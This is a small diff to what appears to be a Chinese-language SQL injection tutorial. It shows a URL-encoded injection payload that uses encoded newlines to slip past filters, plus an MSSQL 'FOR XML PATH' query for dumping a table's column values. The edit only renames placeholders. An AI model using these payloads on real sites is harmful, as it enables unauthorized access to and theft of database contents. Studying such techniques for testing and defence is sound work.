@@ -162,7 +162,7 @@ xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFR
 
 接着注字段的值
 ```html
-SELECT column_name+',' FROM(SELECT column from 数据库名.dbo.table_name)a FOR  XML PATH('')
+SELECT column+',' FROM(SELECT column from 数据库名.dbo.table)a FOR  XML PATH('')
 ```
 这里column指的是字段名,table指的是表名，如果不指定数据库名就会查当前数据库
 运用到实战
